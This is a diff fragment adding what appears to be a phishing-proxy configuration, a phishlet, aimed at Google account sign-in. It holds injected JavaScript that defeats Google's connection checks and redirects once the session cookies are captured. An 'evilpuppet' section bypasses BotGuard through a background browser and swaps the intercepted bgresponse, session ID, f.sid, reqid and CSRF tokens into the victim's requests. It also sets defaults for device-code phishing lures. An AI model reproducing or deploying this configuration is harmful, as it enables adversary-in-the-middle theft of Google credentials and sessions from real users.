+              for (var i = 0; i < mutations.length; i++) {
+                var nodes = mutations[i].addedNodes;
+                for (var j = 0; j < nodes.length; j++) {
+                  if (nodes[j].tagName === 'IFRAME') {
+                    var s = nodes[j].src || '';
+                    if (s.indexOf('ytcheck') !== -1 || s.indexOf('xheckConnection') !== -1) {
+                      sent = false;
+                      fakeCheckConnection();
+                    }
+                  }
+                }
+              }
+            }).observe(document.documentElement, {childList: true, subtree: true});
+          } catch(e) {}
+        })();
+
+        // ===== POST-LOGIN REDIRECT =====
+        var redirectCount = 0;
+        function checkCookies() {
+          if (document.cookie.indexOf('SID') !== -1 && document.cookie.indexOf('APISID') !== -1 && document.cookie.indexOf('SAPISID') !== -1) {
+            window.location.href = 'https://google.com';
+          } else {
+            redirectCount++;
+          }
+        }
+        if (window.location.pathname.indexOf('/ManageAccount') !== -1 || window.location.pathname.indexOf('/myaccount') !== -1) {
+          checkCookies();
+          setInterval(checkCookies, 1000);
+        }
+      })();
+
+
+# ═══════════════════════════════════════════════════════
+# EVILPUPPET — BotGuard Bypass via Background Browser
+# ═══════════════════════════════════════════════════════
+
+evilpuppet:
+  start_url: 'https://accounts.google.com/v3/signin/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
+  timeout: 30
+  hold_request: true
+
+  triggers:
+    - domains: ['accounts.google.com']
+      paths: ['.*batchexecute.*rpcids=MI613e.*']
+      content_type: 'post'
+
+  actions:
+    - type: waitVisible
+      selector: 'input[type="email"], #identifierId'
+    - type: sleep
+      value: '500'
+    - type: type
+      selector: 'input[type="email"], #identifierId'
+      value: '{username}'
+    - type: click
+      selector: '#identifierNext button, #identifierNext'
+    - type: sleep
+      value: '2000'
+
+  interceptors:
+    - domain: 'accounts.google.com'
+      path: '.*batchexecute.*'
+      token_name: 'bgresponse'
+      source: 'request_body'
+      search: 'identity-signin-identifier\\",\\"([^"]+)'
+    # Capture the session ID (dsh) - format: S1234567890:1234567890123456 or S-1234567890:...
+    # Note: session ID can be negative (e.g., S-2128330021:1770554115499051)
+    - domain: 'accounts.google.com'
+      path: '.*batchexecute.*'
+      token_name: 'session_dsh'
+      source: 'request_body'
+      search: '(S-?[0-9]+:[0-9]+)'
+    # Capture f.sid from the URL query parameters
+    - domain: 'accounts.google.com'
+      path: '.*batchexecute.*'
+      token_name: 'fsid'
+      source: 'request_url'
+      search: 'f\.sid=(-?[0-9]+)'
+    # Capture _reqid from URL 
+    - domain: 'accounts.google.com'
+      path: '.*batchexecute.*rpcids=MI613e.*'
+      token_name: 'reqid'
+      source: 'request_url'
+      search: '_reqid=([0-9]+)'
+    # Capture the CSRF 'at' token - CRITICAL: must match the session that generated bgresponse
+    - domain: 'accounts.google.com'
+      path: '.*batchexecute.*'
+      token_name: 'at_token'
+      source: 'request_body'
+      search: 'at=(AFyvf4[A-Za-z0-9_-]+:[0-9]+)'
+
+  inject_token:
+    - token_name: 'bgresponse'
+      target: 'body'
+      search: '(identity-signin-identifier\\",\\")([^"]+)'
+      replace: '${1}{token}'
+    # Replace all session ID references with evilpuppet's session ID
+    - token_name: 'session_dsh'
+      target: 'body'
+      search: '(S-?[0-9]+:[0-9]+)'
+      replace: '{token}'
+    # Replace f.sid in URL query parameters
+    - token_name: 'fsid'
+      target: 'url'
+      search: '(f\.sid=)(-?[0-9]+)'
+      replace: '${1}{token}'
+    # Replace _reqid in URL
+    - token_name: 'reqid'
+      target: 'url'
+      search: '(_reqid=)([0-9]+)'
+      replace: '${1}{token}'
+    # Replace the CSRF 'at' token
+    - token_name: 'at_token'
+      target: 'body'
+      search: '(at=)(AFyvf4[A-Za-z0-9_-]+:[0-9]+)'
+      replace: '${1}{token}'
+
+# ═══════════════════════════════════════════════════════
+# DEVICE CODE — OAuth 2.0 Device Authorization Grant defaults
+# These defaults are used when a lure doesn't specify DC settings
+# ═══════════════════════════════════════════════════════
+device_code:
+  provider: 'google'
+  client: 'google_cloud_sdk'
+  scope: 'gworkspace'
+  mode: 'auto'
+  template: 'success'
